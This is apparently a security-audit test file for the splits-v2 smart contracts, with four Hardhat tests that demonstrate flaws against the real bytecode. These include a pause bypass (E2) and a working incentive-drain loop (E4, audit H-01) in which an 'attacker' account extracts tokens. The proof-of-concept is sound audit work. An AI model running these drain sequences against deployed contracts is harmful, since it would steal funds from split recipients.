/**
 * Concrete edge cases on the REAL contracts (no fork needed).
 * Each `it` prints the exact on-chain evidence for one observation.
 *
 * run: npx hardhat test targets/splits-v2/test/edge.test.js
 */
const { expect } = require("chai");
const ethers = require("ethers");
const { ethers: hre } = require("hardhat");
const artifacts = require("../artifacts.json");

const NATIVE = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
const PREDICT_SALT = "predictDeterministicAddress((address[],uint256[],uint256,uint16),address,bytes32)";
const PREDICT_NONCE = "predictDeterministicAddress((address[],uint256[],uint256,uint16),address)";
const SALT1 = ethers.zeroPadValue("0x01", 32);
const id = (a) => BigInt(a);

function deploy(name, signer, ...args) {
  const a = artifacts[name];
  return new ethers.ContractFactory(a.abi, a.bytecode, signer).deploy(...args);
}
function splitStruct(recipients, allocations, incentive) {
  return {
    recipients,
    allocations,
    totalAllocation: allocations.reduce((a, b) => a + b, 0n),
    distributionIncentive: incentive,
  };
}
async function mustRevert(fn) {
  try {
    const tx = await fn();
    if (tx && tx.wait) await tx.wait();
    return null;
  } catch (e) {
    return e.shortMessage || e.message;
  }
}

describe("splits-v2 edge cases (real bytecode)", function () {
  let warehouse, pushFactory, pullFactory, token, W, T;
  let owner, alice, bob, attacker;

  beforeEach(async () => {
    [owner, alice, bob, attacker] = await hre.getSigners();
    warehouse = await deploy("SplitsWarehouse", owner, "Ether", "ETH");
    pushFactory = await deploy("PushSplitFactory", owner, await warehouse.getAddress());
    pullFactory = await deploy("PullSplitFactory", owner, await warehouse.getAddress());
    token = await deploy("MockERC20", owner);
    W = await warehouse.getAddress();
    T = await token.getAddress();
  });

  it("E1: validate() accepts totalAllocation == 0 -> distribute() can never run (funds locked for owner==0)", async function () {
    // 2 recipients, every allocation 0, totalAllocation 0 -- validate() only checks sum(allocations)==totalAllocation
    const bad = { recipients: [alice.address, bob.address], allocations: [0n, 0n], totalAllocation: 0n, distributionIncentive: 0 };
    const addr = await pushFactory[PREDICT_SALT](bad, owner.address, SALT1);
    await (await pushFactory.createSplitDeterministic(bad, owner.address, owner.address, SALT1)).wait();
    const wallet = new ethers.Contract(addr, artifacts.PushSplit.abi, owner);
    console.log(`        createSplitDeterministic(totalAllocation=0) accepted -> ${addr}`);

    await (await token.mint(addr, 1_000_000n)).wait();
    console.log(`        wallet funded with ${await token.balanceOf(addr)} tokens`);

    const err = await mustRevert(() => wallet.connect(attacker).distribute(bad, T, attacker.address));
    console.log(`        distribute() -> ${err}`);
    expect(err, "distribute must revert (division by zero)").to.not.equal(null);
    expect(await token.balanceOf(addr)).to.equal(1_000_000n); // still stuck

    // and this is not recoverable by anyone else: execCalls / updateSplit are owner-only
    const err2 = await mustRevert(() =>
      wallet.connect(attacker).execCalls([{ to: T, value: 0, data: token.interface.encodeFunctionData("transfer", [attacker.address, 1_000_000n]) }])
    );
    console.log(`        attacker execCalls() -> ${err2}`);
  });

  it("E2: pausing a PushSplit does not stop a third party from emptying its warehouse balance", async function () {
    const s = splitStruct([alice.address, bob.address], [1n, 1n], 0);
    const addr = await pushFactory[PREDICT_SALT](s, owner.address, SALT1);
    await (await pushFactory.createSplitDeterministic(s, owner.address, owner.address, SALT1)).wait();
    const wallet = new ethers.Contract(addr, artifacts.PushSplit.abi, owner);

    await (await token.mint(owner.address, 2_000_000n)).wait();
    await (await token.approve(W, 2_000_000n)).wait();
    await (await warehouse.deposit(addr, T, 1_000_000n)).wait(); // warehouse side
    await (await token.transfer(addr, 1_000_000n)).wait(); // wallet side

    await (await wallet.connect(owner).setPaused(true)).wait();
    console.log(`        split paused = ${await wallet.paused()}`);

    const err = await mustRevert(() => wallet.connect(attacker).distribute(s, T, attacker.address));
    console.log(`        attacker distribute() -> ${err}`);
    expect(err).to.not.equal(null); // pause works for distribute

    // ... but withdrawFromWarehouse is public and NOT behind `pausable`
    const tx = await wallet.connect(attacker).withdrawFromWarehouse(T);
    await tx.wait();
    console.log(
      `        attacker withdrawFromWarehouse() -> ok; warehouse ledger ${await warehouse.balanceOf(addr, id(T))}, wallet ${await token.balanceOf(
        addr
      )}`
    );
    expect(await token.balanceOf(addr) > 1_000_000n).to.equal(true);
  });

  it("E3: withdraw() underflows at a zero ledger balance, so the documented precise flow reverts", async function () {
    const s = splitStruct([alice.address, bob.address], [1n, 1n], 0);
    const addr = await pushFactory[PREDICT_SALT](s, owner.address, SALT1);
    await (await pushFactory.createSplitDeterministic(s, owner.address, owner.address, SALT1)).wait();
    const wallet = new ethers.Contract(addr, artifacts.PushSplit.abi, owner);

    // fresh split: tokens in the wallet, nothing in the warehouse
    await (await token.mint(addr, 1_000_000n)).wait();
    console.log(`        ledger=${await warehouse.balanceOf(addr, id(T))} wallet=${await token.balanceOf(addr)}`);

    const e1 = await mustRevert(() => wallet.connect(attacker).distribute(s, T, 100n, true, attacker.address));
    const e2 = await mustRevert(() => wallet.connect(attacker).distribute(s, T, 100n, false, attacker.address));
    console.log(`        distribute(amount, performWarehouseTransfer=true)  -> ${e1}`);
    console.log(`        distribute(amount, performWarehouseTransfer=false) -> ${e2}`);
    expect(e1).to.not.equal(null);
    expect(e2).to.equal(null);
  });

  it("E4: pull split incentive drain is live (audit H-01 variant): loop withdraw+deposit", async function () {
    // this is the *acknowledged* issue: it needs the owner to set a warehouse incentive
    const s = splitStruct([alice.address], [1n], 0);
    const addr = await pullFactory[PREDICT_SALT](s, owner.address, SALT1);
    await (await pullFactory.createSplitDeterministic(s, owner.address, owner.address, SALT1)).wait();
    const wallet = new ethers.Contract(addr, artifacts.PullSplit.abi, owner);

    await (await token.mint(addr, 1_000_000n)).wait();
    // park the funds in the warehouse (this is the normal state of a pull split)
    await (await wallet.connect(owner).depositToWarehouse(T, 1_000_000n)).wait();
    // owner enables a 1% warehouse withdrawal incentive (opt-in)
    await (
      await wallet
        .connect(owner)
        .execCalls([
          {
            to: W,
            value: 0,
            data: warehouse.interface.encodeFunctionData("setWithdrawConfig", [{ incentive: 10_000, paused: false }]),
          },
        ])
    ).wait();

    const start = await token.balanceOf(attacker.address);
    for (let i = 0; i < 40; i++) {
      const wb = await warehouse.balanceOf(addr, id(T));
      if (wb <= 1n) break;
      try {
        await (await warehouse.connect(attacker).withdraw(addr, [T], [wb], attacker.address)).wait();
        const inWallet = await token.balanceOf(addr);
        if (inWallet > 0n) await (await wallet.connect(attacker).depositToWarehouse(T, inWallet)).wait();
      } catch (e) {
        break;
      }
    }
    const gained = (await token.balanceOf(attacker.address)) - start;
    console.log(`        acknowledged H-01 loop: attacker took ${gained} of 1000000 tokens in 40 cycles`);
    expect(gained > 0n).to.equal(true);
  });
});
